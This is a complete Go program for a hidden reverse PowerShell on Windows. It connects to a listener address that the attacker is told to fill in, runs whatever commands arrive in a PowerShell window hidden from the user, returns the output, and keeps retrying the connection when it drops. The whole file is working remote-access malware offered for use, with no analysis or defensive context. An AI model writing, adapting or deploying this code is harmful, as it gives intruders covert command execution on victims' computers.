package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

func main () {
	reversePShell("192.168.1.2:8088") /*CHANGE HERE - INSERT YOUR LISTENER SOCKET*/
}

func reversePShell(socket string) {
	conn, err := net.Dial("tcp", socket)
	if nil != err {
		if nil != conn {
			conn.Close()
		}
		time.Sleep(time.Minute)
		reversePShell(socket)
	} 

	reader := bufio.NewReader(conn)
	for {
		input, err := reader.ReadString('\n')
		if nil != err {
			conn.Close()
			reversePShell(socket)
			return
		}

		cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/C", input)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		conn.Write(out)
	}


}
